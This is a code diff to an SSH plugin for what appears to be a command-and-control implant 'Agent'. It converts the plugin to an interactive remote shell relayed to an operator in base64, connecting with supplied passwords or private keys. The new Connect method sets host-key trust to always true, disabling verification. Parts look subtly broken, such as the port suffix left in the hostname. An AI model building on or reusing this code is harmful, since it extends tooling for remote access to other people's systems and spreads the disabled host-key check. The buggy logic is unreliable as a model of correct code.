@@ -1,16 +1,18 @@
 ﻿using Renci.SshNet;
 using System.Text;
-
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using ssh;
+using System.Text.Json;
+using System.IO;
 
 namespace Agent
 {
-    public class Plugin : IPlugin
+    public class Plugin : IPlugin, IInteractivePlugin
     {
         public string Name => "ssh";
-        Dictionary<string, SshClient> sessions = new Dictionary<string, SshClient>();
+        Dictionary<string, ShellStream> sessions = new Dictionary<string, ShellStream>();
         string currentSession = "";
         private IMessageManager messageManager { get; set; }
 
@@ -20,140 +22,108 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            try
-            {
-                StringBuilder sb = new StringBuilder();
-
-                string action = args["action"];
-
-                switch (action.ToLower())
-                {
-                    case "exec":
-                        await messageManager.AddResponse(RunCommand(args, job.task.id));
-                        break;
-                    case "connect":
-                        await messageManager.AddResponse(Connect(args, job.task.id));
-                        break;
-                    case "disconnect":
-                        await messageManager.AddResponse(Disconnect(args, job.task.id));
-                        break;
-                    case "list-sessions":
-                        await messageManager.AddResponse(ListSessions(args, job.task.id));
-                        break;
-                    case "switch-session":
-                        if (!string.IsNullOrEmpty(args["args"]))
-                        {
-                            currentSession = args["args"];
-                            await messageManager.AddResponse(new ResponseResult
-                            {
-                                task_id = job.task.id,
-                                process_response = new Dictionary<string, string> { { "message", "0x36" } },
-                                completed = true,
-                            });
-                        }
-                        else
-                        {
-                            await messageManager.AddResponse(new ResponseResult
-                            {
-                                task_id = job.task.id,
-                                process_response = new Dictionary<string, string> { { "message", "0x2D" } },
-                                completed = true,
-                                status = "error"
-                            });
-                        }
-                        break;
-                    default:
-                        await messageManager.AddResponse(new ResponseResult
-                        {
-                            task_id = job.task.id,
-                            process_response = new Dictionary<string, string> { { "message", "0x2E" } },
-                            completed = true,
-                            status = "error"
-                        });
-                        break;
-                }
-
-            }
-            catch (Exception e)
-            {
-                messageManager.Write(e.ToString(), job.task.id, true, "error");
+            //Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
+            SshArgs args = JsonSerializer.Deserialize<SshArgs>(job.task.parameters);
+            
+            if(string.IsNullOrEmpty(args.username) || string.IsNullOrEmpty(args.password) || string.IsNullOrEmpty(args.hostname)) {
                 return;
             }
+
+            this.Connect(args, job.task.id);
         }
-        ResponseResult Connect(Dictionary<string, string> args, string task_id)
+        private void Connect(SshArgs args, string task_id)
         {
             ConnectionInfo connectionInfo;
-            string hostname = args["hostname"];
-            int port = 22;
-            if (hostname.Contains(':'))
+            int port = this.GetPortFromHost(args.hostname);
+
+            ConnectionInfo ci = null;
+            if (!string.IsNullOrEmpty(args.keypath))
             {
-                string[] hostnameParts = hostname.Split(':');
-                hostname = hostnameParts[0];
-                port = int.Parse(hostnameParts[1]);
+                ci = this.ConnectWithKey(args, port);
+            }
+            else
+            {
+                ci = this.ConnectWithUsernamePass(args, port);
             }
 
-            if (args.ContainsKey("keypath") && !String.IsNullOrEmpty(args["keypath"])) //SSH Key Auth
+            SshClient sshClient = new SshClient(ci);
+            sshClient.HostKeyReceived += (sender, e) =>
             {
-                string keyPath = args["keypath"];
-                PrivateKeyAuthenticationMethod authenticationMethod;
-
-
-                if (!String.IsNullOrEmpty(args["password"]))
-                {
-                    PrivateKeyFile pk = new PrivateKeyFile(keyPath, args["password"]);
-                    authenticationMethod = new PrivateKeyAuthenticationMethod(args["username"], new PrivateKeyFile[] { pk });
-                    connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
-                }
-                else
-                {
-                    PrivateKeyFile pk = new PrivateKeyFile(keyPath);
-                    authenticationMethod = new PrivateKeyAuthenticationMethod(args["username"], new PrivateKeyFile[] { pk });
-                    connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
-                }
-            }
-            else //Username & Password Auth
-            {
-                PasswordAuthenticationMethod authenticationMethod = new PasswordAuthenticationMethod(args["username"], args["password"]);
-                connectionInfo = new ConnectionInfo(hostname, port, args["username"], authenticationMethod);
-            }
-            SshClient sshClient = new SshClient(connectionInfo);
+                e.CanTrust = true;
+            };
 
             try
             {
                 sshClient.Connect();
-
-                if (sshClient.IsConnected)
-                {
-                    string guid = Guid.NewGuid().ToString();
-                    sessions.Add(guid, sshClient);
-                    currentSession = guid;
-
-                    return new ResponseResult
-                    {
-                        task_id = task_id,
-                        user_output = $"Initiated Session: {sshClient.ConnectionInfo.Username}@{sshClient.ConnectionInfo.Host} - {guid}",
-                        completed = true,
-                    };
-                }
-                return new ResponseResult
-                {
-                    task_id = task_id,
-                    process_response = new Dictionary<string, string> { { "message", "0x31" } },
-                    completed = true,
-                };
             }
             catch (Exception e)
             {
-                return new ResponseResult
+                this.messageManager.AddResponse(new ResponseResult
                 {
                     task_id = task_id,
-                    user_output = e.ToString(),
+                    process_response = new Dictionary<string, string> { { "message", e.ToString() } },
                     completed = true,
-                };
+                });
             }
 
+            if (sshClient.IsConnected)
+            {
+                var stream = sshClient.CreateShellStream("", 80, 30, 0, 0, 0);
+                stream.DataReceived += (sender, e) =>
+                {
+                    messageManager.AddResponse(new InteractMessage()
+                    {
+                        data = Misc.Base64Encode(e.Data),
+                        task_id = task_id,
+                        message_type = InteractiveMessageType.Output
+                    });
+                };
+
+                sessions.Add(task_id, stream);
+
+                return;
+            }
+
+            this.messageManager.AddResponse(new ResponseResult
+            {
+                task_id = task_id,
+                process_response = new Dictionary<string, string> { { "message", "0x31" } },
+                completed = true,
+            });
+
         }
+
+        private int GetPortFromHost(string host)
+        {
+            if (host.Contains(':'))
+            {
+                string[] hostParts = host.Split(':');
+                return int.Parse(hostParts[1]);
+            }
+            return 22;
+        }
+
+        private ConnectionInfo ConnectWithKey(SshArgs args, int port)
+        {
+            PrivateKeyFile pk;
+            if (!string.IsNullOrEmpty(args.password))
+            {
+                pk = new PrivateKeyFile(args.keypath, args.password);
+            }
+            else
+            {
+                pk = new PrivateKeyFile(args.keypath);
+            }
+
+            AuthenticationMethod am = new PrivateKeyAuthenticationMethod(args.username, new PrivateKeyFile[] {pk });
+            return new ConnectionInfo(args.hostname, port, args.username, am);
+        }
+        private ConnectionInfo ConnectWithUsernamePass(SshArgs args, int port)
+        {
+            PasswordAuthenticationMethod authenticationMethod = new PasswordAuthenticationMethod(args.username, args.password);
+            return new ConnectionInfo(args.hostname, port, args.username, authenticationMethod);
+        }
+
         ResponseResult Disconnect(Dictionary<string, string> args, string task_id)
         {
             string session;
@@ -282,6 +252,19 @@ namespace Agent
                 user_output = sb.ToString(),
                 completed = true,
             };
+        }
+
+        public void Interact(InteractMessage message)
+        {
+            switch (message.message_type)
+            {
+                case InteractiveMessageType.Input:
+                    this.sessions[message.task_id].Write(Misc.Base64Decode(message.data));
+                    break;
+                default:
+                    this.sessions[message.task_id].Write(Misc.Base64Decode(message.data));
+                    break;
+            }
         }
     }
 }
